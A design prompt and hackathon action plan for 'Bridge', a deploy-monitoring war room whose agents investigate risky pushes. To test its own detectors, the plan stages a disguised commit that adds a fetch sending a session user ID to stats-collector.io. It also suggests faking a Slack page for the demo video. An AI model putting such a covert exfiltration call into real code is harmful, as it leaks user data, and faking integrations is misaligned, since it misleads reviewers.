# War Room Design Prompt

Copy-paste this into Claude (or v0, Cursor, etc.) to kick off the war room frontend.

---

## Prompt

Build the frontend for **Bridge** — a production deploy war room. This is a hackathon project for Vercel's Workflow track, so the frontend must look like the demo screenshot that wins. Treat visual polish as a first-class deliverable, not an afterthought.

### What Bridge Does (Context Only — Don't Build the Backend)

Bridge is a durable multi-agent system that watches a codebase's deployments. When code ships, it scores the push for risk across structural, behavioral, and temporal signals. If anomalous, it dispatches up to five specialist "investigator agents" in parallel — Trace Inspector, Runtime Inspector, History Inspector, Dependency Inspector, Diff Inspector — that fan out to investigate. A Synthesizer agent then collapses their findings into a single verdict.

The war room is where humans watch all of this happen in real time.

### Aesthetic Anchor — Read This Twice

**Bloomberg terminal meets Mission Impossible command centre.** Not "modern SaaS dashboard." Not "shadcn default." Not "AI app with gradient blobs." We want the screen to feel like *something is being monitored*, like a NASA mission control or a trading floor or the bridge of a starship. If a judge walks past and glances for one second, they should think "what is this serious-looking thing?"

**Specific moves:**
- Pure black or near-black background (`#0a0a0a` to `#000`)
- Monospace everywhere — IBM Plex Mono, JetBrains Mono, or Berkeley Mono
- Single dominant accent color: **amber/orange** (`#ff8800`-ish) for the default "armed" state, switching to **red** (`#ff3344`) on critical, **green** (`#00ff88`) only for confirmed all-clear
- High-contrast text, mostly off-white (`#e8e8e8`) with muted gray (`#666`) for secondary
- Thin borders, never rounded more than 2px, often 0
- Sharp corners over rounded. No drop shadows. No glassmorphism.
- Subtle CRT scanline overlay is *optional* but on-brand if subtle (≤3% opacity)
- Small uppercase labels with letter-spacing: `OPS://DEPLOY-MONITOR` style headers
- Numbers that update should tick with a brief flash, not a smooth fade
- Status indicators use brackets and pipes: `[ ARMED ]`, `[ CRITICAL ]`, `// MONITORING //`

**Reference vibes:** Bloomberg Terminal, the Severance computer, NORAD displays in 80s movies, Watch Dogs UI, the Linear command palette, the Vercel observability dashboard at its most serious.

**What to avoid:**
- Tailwind defaults that scream "I made this in an afternoon"
- Purple-to-pink gradients
- Soft shadows, glass cards, frosted blur
- Friendly/cute language ("✨ Awesome!", "Let's get started!")
- Emoji except in status indicators where intentional
- Centered hero layouts — this is a dense, info-rich surface

### Layout — Single Screen, No Scrolling

Optimize for a 1440×900 demo screen. Everything visible at once. Think trading desk: maximum information density without feeling cluttered.

```
┌─────────────────────────────────────────────────────────────────────┐
│ BRIDGE // PRODUCTION WAR ROOM                  [LIVE]  03:42:18 UTC │  ← thin top bar
├─────────────────────────────────────────────────────────────────────┤
│                                                                       │
│   ╔═══════════════════════════════════════════════════════════╗    │
│   ║                  [ ALL CLEAR ]                              ║    │  ← BIG status block
│   ║                  monitoring · 47 deploys analyzed · 12d up  ║    │     (flips to CRITICAL)
│   ╚═══════════════════════════════════════════════════════════╝    │
│                                                                       │
├─────────────────────────────────────────────────────────────────────┤
│ DEPLOY TIMELINE — LAST 30 DAYS                                       │
│ ····· · ·· ······ ··· · ····█···· ·· ······· ·· · ··· ··· ·▲       │  ← horizontal dot timeline
│ Jul 1                                                       NOW       │     dots = deploys, color = score
├──────────────────────────────────┬──────────────────────────────────┤
│ INVESTIGATOR AGENTS              │ LIVE FEED // #deploys             │
│ ┌────────────┬────────────┐     │ 03:42:18  ▲ Anomaly detected     │  ← Slack thread mirror
│ │ TRACE      │ RUNTIME    │     │ 03:42:19  Dispatching agents...   │     streams in live
│ │ [ IDLE ]   │ [ IDLE ]   │     │ 03:42:21  History Inspector...    │
│ ├────────────┼────────────┤     │ 03:42:23  Dep Inspector found...  │
│ │ HISTORY    │ DEPENDENCY │     │ ...                                │
│ │ [ IDLE ]   │ [ IDLE ]   │     │                                    │
│ ├────────────┴────────────┤     │                                    │
│ │ DIFF                    │     │                                    │
│ │ [ IDLE ]                │     │                                    │
│ └─────────────────────────┘     │                                    │
├──────────────────────────────────┼──────────────────────────────────┤
│ ANOMALY HEATMAP                  │ THREAT SURFACE // 3 OPEN          │
│ files × hours grid               │ • CVE-2024-xxxx  unpatched dep    │
│ intensity = unusualness          │ • auth.ts modified, no test       │
│                                  │ • new endpoint /api/admin/export  │
└──────────────────────────────────┴──────────────────────────────────┘
```

### Components — Specifications

#### 1. Top Bar (thin, ~40px)
- Left: `BRIDGE // PRODUCTION WAR ROOM` in bold mono
- Right: live UTC clock (ticks every second), `[LIVE]` badge with pulse animation
- 1px bottom border in muted gray

#### 2. Big Status Block (the centerpiece — ~120px tall)
- Four states with distinct visual treatments:
  - `[ ALL CLEAR ]` — green text, calm
  - `[ MONITORING ]` — amber text, slow pulse
  - `[ ANOMALY DETECTED ]` — orange, faster pulse
  - `[ CRITICAL ]` — red, fast pulse, optional thin red border flash
- Subtitle line below in smaller muted text: `monitoring · 47 deploys analyzed · 12d uptime`
- The state transition should feel *physical* — when it flips from ALL CLEAR to CRITICAL, there's a brief 200ms "snap" animation, not a fade

#### 3. Deploy Timeline (horizontal, ~80px tall)
- Each deploy is a small dot or thin vertical bar
- Color encodes risk score: green (`<0.3`), amber (`0.3-0.6`), orange (`0.6-0.8`), red (`>0.8`)
- Hover reveals tooltip: `sha · author · TL;DR · score`
- Click selects the deploy and updates the rest of the dashboard
- Latest deploy on the right with a small `▲ NOW` marker
- Subtle gridlines for day boundaries

#### 4. Investigator Agent Cards (5 cards in a 2-2-1 grid or row)
- Each card has:
  - Agent name in uppercase mono: `TRACE INSPECTOR AGENT`
  - Status badge: `[ IDLE ]`, `[ DISPATCHED ]`, `[ INVESTIGATING ]`, `[ COMPLETE ]`, `[ FAILED ]`
  - When active: a small streaming text area showing the agent's current thought/action ("Querying trace API…", "Found 3 anomalous spans…")
  - When complete: 1-line finding summary + a colored severity dot
- The five agents: `TRACE`, `RUNTIME`, `HISTORY`, `DEPENDENCY`, `DIFF`
- When dispatched, all cards visibly activate within ~500ms of each other — staggered but clearly parallel
- Use a subtle scanning shimmer animation on `INVESTIGATING` cards

#### 5. Live Feed (right column, scrolling)
- Mirrors the Slack thread for the active deploy
- Each line: `HH:MM:SS  message` in mono
- Color-coded by severity: gray, amber, red
- Auto-scrolls to bottom; new entries appear with a brief left-edge highlight
- Header: `LIVE FEED // #deploys` with a tiny green dot showing connection status

#### 6. Anomaly Heatmap (bottom-left)
- X axis: time (last 7 days, hourly buckets)
- Y axis: file paths (top ~12 most-changed files)
- Cell color intensity = how unusual the change at that file/time was
- Hover reveals: file, time, deploys at that bucket, average score
- Use the accent amber palette — darker = more anomalous

#### 7. Threat Surface (bottom-right)
- A compact list of 3-8 open risks
- Each line: severity dot + short description + age (`14d`, `2h`)
- Severity dots: red/orange/amber/gray
- Click an item to expand details inline
- Header counter: `THREAT SURFACE // 3 OPEN`

### Live Data — The Shape You're Coding Against

The backend will push events via SSE. Build against this contract:

```ts
type StatusEvent = {
  type: 'status'
  state: 'all_clear' | 'monitoring' | 'anomaly' | 'critical'
  uptime_seconds: number
  deploys_analyzed: number
}

type DeployEvent = {
  type: 'deploy'
  id: string
  sha: string
  author: string
  pushed_at: string  // ISO
  files_changed: string[]
  tldr: string
  score: number  // 0-1
  signals: {
    structural: string[]
    behavioral: string[]
    temporal: string[]
    compounds: string[]
  }
}

type InvestigatorEvent = {
  type: 'investigator'
  deploy_id: string
  agent: 'trace' | 'runtime' | 'history' | 'dependency' | 'diff'
  status: 'idle' | 'dispatched' | 'investigating' | 'complete' | 'failed'
  current_action?: string  // for streaming during 'investigating'
  finding?: { severity: 'low' | 'medium' | 'high' | 'critical'; summary: string }
}

type FeedEvent = {
  type: 'feed'
  deploy_id: string
  ts: string
  severity: 'info' | 'warn' | 'critical'
  message: string
}

type VerdictEvent = {
  type: 'verdict'
  deploy_id: string
  level: 'benign' | 'watch' | 'investigate' | 'critical'
  summary: string
  concerns: string[]
  suggested_action: string
}

type ThreatSurfaceEvent = {
  type: 'threat_surface'
  items: Array<{
    id: string
    severity: 'low' | 'medium' | 'high' | 'critical'
    description: string
    age_seconds: number
    deploy_id?: string
    status: 'open' | 'acknowledged' | 'resolved'
  }>
}
```

For now, **mock all of this with a fake event stream** that runs on a timer and walks through the demo scenario below. Build the SSE hook so swapping to a real backend is a one-line change.

### The Demo Scenario — Animate This End-to-End

Build a `runDemo()` function that, when called, plays out this exact sequence over ~25 seconds:

| t (s) | Event |
|---|---|
| 0 | Status: `ALL CLEAR`, timeline shows 47 green deploys, threat surface has 1 stale item |
| 2 | New deploy event: `lib/auth.ts` modified, author `dev-3`, sha `a4f2c91`, pushed_at NOW |
| 3 | Status flashes to `MONITORING`, new dot appears on timeline (initially gray) |
| 4 | Score arrives: `0.91`. Dot turns red. Status snaps to `CRITICAL` (red, pulsing). |
| 5 | Five investigator cards: `IDLE` → `DISPATCHED` (staggered ~150ms apart) |
| 6 | Cards transition to `INVESTIGATING`, streaming text begins |
| 7-12 | Each agent streams 2-3 lines of "current_action" |
| 13 | Trace Inspector: `COMPLETE` — "No new error patterns" (green) |
| 14 | History Inspector: `COMPLETE` — "Author has never modified auth code" (red) |
| 15 | Dependency Inspector: `COMPLETE` — "No new dependencies" (green) |
| 16 | Diff Inspector: `COMPLETE` — "New external fetch() to stats-collector.io" (red) |
| 17 | Runtime Inspector: `COMPLETE` — "No runtime anomalies yet" (amber) |
| 18 | Verdict modal slides in with synthesizer output: `CRITICAL` level, 3 concerns |
| 19 | Threat surface gains a new red item at the top |
| 20 | Live feed shows Slack thread with bot message + a "PAGE" indicator |
| 25 | Hold final state |

A `Reset` button restores the calm initial state.

### Tech

- **Next.js App Router**, TypeScript, single-file artifact preferred for the demo page
- **Tailwind** is fine but use only core utilities; don't import shadcn defaults — they're too soft for this aesthetic
- Custom CSS is encouraged for the status block, scanline effect, and animations
- Use **Framer Motion** for the snap/pulse/stagger animations
- Use **Recharts** or **D3** only if needed for the heatmap; otherwise hand-rolled SVG is more controllable
- Mono fonts: load from Google Fonts or use system mono fallback
- Build it as a single page at `app/(warroom)/page.tsx` with components in `app/(warroom)/components/`

### Non-Negotiables

1. **No friendly defaults.** No "Welcome to Bridge!" copy. No emoji in body text. No rounded-2xl cards.
2. **Information density.** Every panel earns its space. White space is for breathing, not for vibes.
3. **Demo must run on first paint.** The page should auto-start the demo scenario after a 3-second "calm" state, or show a `RUN DEMO` button in the corner. Judges will not click around.
4. **Looks ridiculous on a phone, fine.** Optimize for laptop demo screen. Mobile is out of scope.
5. **Build the empty/calm state to be just as compelling as the alarm state.** A boring war room when nothing is wrong is not boring — it's *armed.*

### Deliverable

A working Next.js page that:
1. Renders the full layout above, populated by mock data
2. Auto-runs the demo scenario on load (with a reset button)
3. Hits all seven specified components with the specified interactions
4. Looks, on a screenshot, like the kind of thing that wins a hackathon

Do not stub components with "TODO" placeholders. Every component must be fully implemented and visually finished, even if it's wired to mock data.

Start by writing the layout shell, then build the status block first (it's the centerpiece), then the timeline, then the investigator cards. Heatmap and threat surface last.
# Bridge — 24h Action Plan

Ruthless execution checklist. Frontend war room already designed in Claude. Everything below is what's left.

**Track:** Vercel WDK · **Goal:** Win Track 1 · **Time:** ~22h remaining

---

## Phase 0 — Setup (target: 1h)

- [ ] Create new Next.js project: `npx create-next-app@latest bridge --no-src-dir --typescript --tailwind --app`
- [ ] Add WDK: `npx workflow@latest`
- [ ] Wrap Next config with `withWorkflow(nextConfig)` in `next.config.ts`
- [ ] Get AI Gateway API key from https://vercel.com/ai-gateway, add to `.env.local` as `AI_GATEWAY_API_KEY`
- [ ] Install deps: `npm i @workflow/ai octokit @slack/web-api ai zod`
- [ ] Connect Vercel KV (or Vercel Postgres) from dashboard, pull env vars: `vercel env pull`
- [ ] Drop the existing Claude-designed war room frontend into `app/(warroom)/` — keep mock data working for now
- [ ] Push to GitHub, deploy to Vercel — confirm preview URL works
- [ ] Create test repo (or use an existing personal one) for the demo target

---

## Phase 1 — Backend Skeleton (target: 1h)

**Goal: real GitHub push appears as a row on the dashboard**

- [ ] Create `app/api/webhooks/github/route.ts` — receives push events, validates signature, writes raw push to KV under `deploys:{sha}`
- [ ] Set up GitHub webhook on the test repo pointing at the deployed URL — secret in env as `GITHUB_WEBHOOK_SECRET`
- [ ] Create `lib/db.ts` with `kv.set` / `kv.get` / `kv.list` helpers and key conventions: `deploys:{sha}`, `verdicts:{sha}`, `threats:{id}`, `history:author:{login}`, `history:file:{path}`
- [ ] Create `app/api/stream/deploys/route.ts` — SSE endpoint that subscribes to KV change events (or polls every 1s for hackathon speed)
- [ ] Test: push to the test repo, see a row appear on the war room timeline
- [ ] Commit, deploy, confirm webhook fires in production

---

## Phase 2 — Pipeline Backbone (target: 3h)

**Goal: real push → real signals → real score → real dashboard row with TL;DR**

### 2a. Workflow scaffolding

- [ ] Create `workflows/watchdog.ts` — top-level workflow function with `"use workflow"` directive
- [ ] Wire webhook to invoke watchdog with `{ sha, repo, before, after }`
- [ ] Add `workflows/steps/ingest.ts` with `"use step"` — fetches diff via Octokit, returns `{ files: [{path, additions, deletions, patch}], commit_message, author, pushed_at }`

### 2b. Structural signal extraction

- [ ] Create `lib/signals/structural.ts` — pure functions, each returns `{ matched: bool, severity: 0-1, evidence: string }`
- [ ] Implement signal #1: new external `fetch()` / `axios` / `http.request` (regex on patch additions)
- [ ] Implement signal #2: auth path touched (`auth`, `session`, `token`, `permission`, `middleware` in path)
- [ ] Implement signal #3: secret-shaped strings (regex for API keys, JWTs, AWS keys)
- [ ] Implement signal #4: critical-path file touched (configurable list in `lib/critical-paths.ts`)
- [ ] Implement signal #5: new dependency in `package.json` diff
- [ ] Implement signal #9: new API endpoint (new file under `app/api/`)
- [ ] Wire into `workflows/steps/extract-signals.ts`

### 2c. Temporal signals

- [ ] Create `lib/signals/temporal.ts` — checks `pushed_at` against business hours (configurable, default 09–18 UTC)
- [ ] Off-hours, weekend, rapid-succession (compare to last deploy timestamp in KV)

### 2d. Behavioral signals (SQL-lookup version, NOT embeddings)

- [ ] Create `lib/signals/behavioral.ts`
- [ ] Implement author-path mismatch: `kv.get('history:author:{login}')` returns set of touched dirs; flag if current dirs ∉ set
- [ ] Implement file-hour novelty: `kv.get('history:file:{path}')` returns hour histogram; flag if current hour count = 0
- [ ] Implement file-co-change novelty: `kv.get('history:cochange:{a}:{b}')` returns count; flag if 0 for new pairs
- [ ] Update history records on every push (append, don't replace)

### 2e. Scoring

- [ ] Create `lib/score.ts` with the formula: `0.35 * structural + 0.35 * behavioral + 0.15 * temporal + 0.15 * compound_bonus`
- [ ] Implement compound rules: auth+external+off-hours, critical+novel-author, dep+payment-file
- [ ] Add `workflows/steps/score.ts` step that returns final score + verdict bucket

### 2f. TL;DR generation

- [ ] Create `workflows/steps/summarize.ts` — uses AI Gateway (`anthropic/claude-sonnet-4-6`) to generate 2-sentence TL;DR from diff
- [ ] Persist full deploy record to KV with all signals, score, TL;DR

---

## Phase 3 — Wire War Room to Live Data (target: 2h)

**Goal: existing UI replaces all mock data with real SSE from the backend**

- [ ] Create `lib/sse-events.ts` with the typed event shapes: `StatusEvent`, `DeployEvent`, `InvestigatorEvent`, `FeedEvent`, `VerdictEvent`, `ThreatSurfaceEvent`
- [ ] Create `useDeploysSSE()` hook that subscribes to `/api/stream/deploys` and dispatches typed events
- [ ] Replace mock data in `status-block.tsx` with live status derived from latest deploy score
- [ ] Replace mock data in `deploy-timeline.tsx` with live KV deploy list
- [ ] Replace mock data in `slack-feed.tsx` with live event stream
- [ ] Replace mock data in `threat-surface.tsx` with live KV threats list
- [ ] **Keep investigator-cards mocked for now** — they'll go live in Phase 4
- [ ] Keep heatmap on static seeded data (will upgrade in Phase 7)
- [ ] Test: push to test repo, watch war room update live end-to-end

---

## Phase 4 — Investigator Agents + Synthesizer (target: 4h)

**Goal: high-score push triggers visible parallel agent activity ending in a verdict**

### 4a. Investigator base

- [ ] Create `workflows/investigators/` directory
- [ ] Each investigator is a `"use workflow"` function that takes `{ sha, signals, deploy_id }` and emits SSE events for `dispatched` → `investigating` → `complete`/`failed`
- [ ] Use `DurableAgent` from `@workflow/ai/agent` for each — gives streaming + retries + observability for free

### 4b. Build three investigators (skip Trace + Runtime)

- [ ] **History Inspector** — queries KV history for: prior commits by author to this path, hour-of-day for this file, co-change pairs. LLM step writes one-sentence finding.
- [ ] **Dependency Inspector** — runs `npm audit --json` in Vercel Sandbox if `package-lock.json` changed. Checks new deps against npm metadata for typosquat signals (low download count, recent publish). LLM step writes finding.
- [ ] **Diff Inspector** — pure LLM step with security-focused prompt over the patch. Looks for: hardcoded URLs, eval/exec, auth bypass shapes, error swallowing.

### 4c. Two stub investigators (look intentional, not lazy)

- [ ] **Trace Inspector** card — renders as `[ N/A — no observability source connected ]` with a tooltip explaining "connect Vercel observability to enable"
- [ ] **Runtime Inspector** card — same pattern: `[ N/A — no log source connected ]`
- [ ] These appearing as `N/A` reads as configurable product behavior, not skipped work

### 4d. Dispatch + Synthesizer

- [ ] In `watchdog.ts`, after scoring above threshold (≥0.6), dispatch all live investigators in parallel via `Promise.all` (WDK handles durability per sub-workflow)
- [ ] Create `workflows/synthesizer.ts` — `DurableAgent` that takes all investigator findings + signals + score, returns `{ level, summary, concerns: [], suggested_action }`
- [ ] Emit verdict event over SSE
- [ ] Wire investigator cards in war room to live SSE — cards now spin up for real
- [ ] Wire verdict modal to live SSE — modal appears when synthesizer completes

---

## Phase 5 — Slack Page + Human-in-the-Loop Pause (target: 3h)

**Goal: the WDK money shot — workflow pauses for human input, resumes on click**

- [ ] Create Slack app at api.slack.com — bot token + signing secret in env
- [ ] Hardcode single channel ID (`SLACK_CHANNEL_ID`) — no OAuth flow, no install UI
- [ ] Create `lib/slack.ts` with `postMessage`, `postBlocks`, `addReaction` helpers
- [ ] In `watchdog.ts`, after Synthesizer returns `critical` level, post a Block Kit message with: TL;DR, top 3 concerns, two buttons: `Acknowledge` and `Hold Rollback`
- [ ] **THE PAUSE:** workflow awaits a Slack interaction event for this `deploy_id` (use a WDK signal/wait pattern — pause until external resume)
- [ ] Create `app/api/slack/interactive/route.ts` — receives button click, validates signing secret, resumes the paused workflow with the chosen action
- [ ] On resume: update KV with ack state, emit SSE to update threat surface and verdict modal
- [ ] War room shows `AWAITING ACK` badge on the verdict modal while paused — flips to `ACKNOWLEDGED` on resume
- [ ] Test end-to-end: push triggers page → Slack message arrives → click button → war room updates within 1s

---

## Phase 6 — Seed Demo History + Stage The Commit (target: 2h)

**Goal: the behavioral diff has real-looking history, and the demo commit is rehearsed**

### 6a. Backfill history

- [ ] Create `data/seed-history.ts` script — reads last 30 days of git log from target repo, runs each commit through the structural + behavioral signal pipeline, writes to KV
- [ ] Run it: `npx tsx data/seed-history.ts <repo-path>`
- [ ] Verify history records exist for known authors and known files
- [ ] Spot-check the war room timeline shows 30 days of dots with believable score distribution

### 6b. Stage the demo commit

- [ ] Create a new git branch `demo/staged` in the target repo
- [ ] Author identity: configure git to use a contributor whose history (in the seeded data) is *only* in `components/ui/` — never in `lib/auth/`
- [ ] The commit:
  - File: `lib/auth.ts` (or whichever auth file actually exists in your target repo)
  - Change: add `await fetch('https://stats-collector.io/track', { method: 'POST', body: JSON.stringify({ user: session.userId }) })` somewhere inside an existing function
  - Commit message: something innocuous like `chore: add auth metrics emitter`
- [ ] Don't push it yet — keep it staged in a worktree ready to push live
- [ ] Verify the signals fire correctly when you push: structural #1, #2; behavioral author-path; temporal #16 if you're rehearsing late

### 6c. Demo reset script

- [ ] Create `scripts/reset-demo.sh` that: clears `deploys:` and `threats:` keys for shas after a watermark, restores history records to pre-demo state, posts a "demo reset" message to Slack
- [ ] Run it before each rehearsal
- [ ] Run it once more 5 minutes before the live demo

---

## Phase 7 — System-Area Heatmap (target: 1.5h, OPTIONAL if time tight)

**Goal: replace files × hours heatmap with architectural-area treemap**

- [ ] Create `lib/file-classifier.ts` with regex rules → `{ area, subarea, is_critical }`:
  - `^app/api/auth` → api/auth/critical
  - `^app/api/payments` → api/payments/critical
  - `^app/api/admin` → api/admin/critical
  - `^app/api/.+/webhooks` → api/webhooks
  - `^app/api/` → api/public
  - `^lib/auth` → api/auth/critical
  - `^app/\(.+\)` → web/[group]
  - `^components/` → web/components
  - `^workflows/` → workers/workflows
  - `^app/api/cron` → workers/cron
  - `/db/` or `/prisma/` or `/drizzle/` → data/schemas
  - `lib/db/` → data/queries
  - `migrations/` → data/migrations
  - `middleware` → infra/middleware
  - `^\.env` or `next.config` → infra/env
  - `^\.github/` or `vercel.json` → infra/ci
- [ ] Aggregate area scores: `area_score = 0.6 * max(file_scores) + 0.4 * mean(file_scores)`
- [ ] Build `<SystemHeatmap />` component — 6-cell grid (api / web / workers / data / infra / third), each cell sized by activity share, sub-cells for subareas, color = score, red border glow when area score > 0.7
- [ ] Replace existing files × hours heatmap in war room
- [ ] **CUT THIS ENTIRELY if Phase 5 isn't done by hour 17**

---

## Phase 8 — Demo Polish (target: 2h)

- [ ] Add `RUN DEMO` button in war room corner that triggers the staged push via API call
- [ ] Add `RESET` button next to it that calls the reset script
- [ ] Add `WORKFLOW dep-{id} · resumed Nx · Nm runtime` line in top header — pulls from WDK's own observability for free credibility
- [ ] Add live-pulsing green dot next to `[LIVE]` badge in top bar
- [ ] Make sure investigator cards show `ACTIVE N/5 DONE M/5` counter that ticks during the demo
- [ ] Verify verdict modal doesn't cover the timeline — anchor it bottom-right or make it click-to-expand from a `VERDICT READY ▶` pill
- [ ] Rename every "Inspector" to "Inspector Agent" in UI copy — positioning matters
- [ ] Run full demo end-to-end **at least 3 times**, fix what breaks each time

---

## Phase 9 — Record Demo Video (target: 1h, NON-NEGOTIABLE)

This is your insurance against the live demo breaking on stage.

- [ ] Use OBS or QuickTime — 1080p screen recording
- [ ] **Take 1:** screen-only with voiceover, follow the 3-minute script exactly
- [ ] **Take 2:** picture-in-picture with your face if you're brave
- [ ] Edit lightly — trim dead air, no fancy cuts
- [ ] Upload to YouTube unlisted + Loom + keep local copy
- [ ] If submission requires a video link, this is it

### The 3-minute demo script

- [ ] **0:00–0:20 — Hook.** "Every team has a Slack channel where deploys go to die. Bridge replaces it with a war room that *investigates* pushes for you." Show calm war room.
- [ ] **0:20–0:50 — The push.** Live: push the staged commit. Status flips ALL CLEAR → MONITORING → CRITICAL. Five agent cards spin up.
- [ ] **0:50–1:30 — The investigation.** Talk through each agent's finding as it streams. *"History agent: this author has never touched auth. Diff agent: new external fetch to a domain not in the allowlist."*
- [ ] **1:30–2:00 — The synthesis.** Verdict modal appears. Read suggested action.
- [ ] **2:00–2:30 — Durability moment.** "While I've been talking, this workflow has been paused waiting for me." Click Acknowledge in Slack. War room updates.
- [ ] **2:30–3:00 — Close.** "Built on Vercel WDK. Each agent is a durable sub-workflow. The whole investigation survives crashes, redeploys, and pauses for as long as humans need. Thanks."
- [ ] Practice this **out loud, with a timer**, twice minimum

---

## Phase 10 — Submission + Sleep (target: 1h)

- [ ] Push final code to GitHub, make repo public
- [ ] Write `README.md` opening with the WDK story (≥500 words, ends with screenshot)
- [ ] Add screenshot of war room in CRITICAL state to the README
- [ ] Submit to hackathon: project name, GitHub URL, deploy URL, video URL, team members, track = WDK
- [ ] Sleep ≥3 hours if humanly possible
- [ ] Eat actual food before pitch
- [ ] Charge laptop, test HDMI/dongle, bring backup adapter

---

## Hard Cuts If You're Behind

In priority order, cut from the bottom up — never compromise the top:

- ❌ Cut first: System-area heatmap (Phase 7)
- ❌ Cut next: Live pulsing dots, sparklines, polish details from Phase 8
- ❌ Cut next: One of the three real investigators (drop Dependency Inspector, keep History + Diff)
- ❌ Cut next: Behavioral file-co-change novelty (keep author-path + hour novelty)
- ❌ Last resort: Real Slack integration — fake the page with an in-app modal that says `Slack message sent: ...` (LIES BUT WORKS for video; do NOT do this if the live demo will be on real Slack)

**Never cut:**
- ✅ The pipeline backbone (Phase 2)
- ✅ At least History + Diff investigators (Phase 4)
- ✅ Slack pause/resume (Phase 5) — this is the WDK money shot
- ✅ Demo commit staging + history seeding (Phase 6)
- ✅ Demo video recording (Phase 9)

---

## Hour-by-Hour Target Schedule

| Hour | Doing |
|---|---|
| 0–1 | Phase 0: Setup |
| 1–2 | Phase 1: Backend skeleton |
| 2–5 | Phase 2: Pipeline backbone |
| 5–7 | Phase 3: Wire war room to live data |
| 7–11 | Phase 4: Investigators + synthesizer |
| 11–14 | Phase 5: Slack pause/resume |
| 14–16 | Phase 6: Seed history + stage commit |
| 16–17.5 | Phase 7: System heatmap (or polish if cut) |
| 17.5–19.5 | Phase 8: Demo polish + 3 dry runs |
| 19.5–20.5 | Phase 9: Record demo video |
| 20.5–21.5 | Phase 10: Submission + README |
| 21.5–24 | Sleep + breakfast + final dry run |

---

## The One Thing That Determines If You Win

**The demo commit triggers cleanly on first try, live, in front of judges.**

Run it 5+ times before the demo. Find the failure modes. Fix them. Judges should never see anything you haven't seen succeed at least 5 times.

Build backwards from the demo moment. Treat the war room as the deliverable. Stage the durability beat. Win.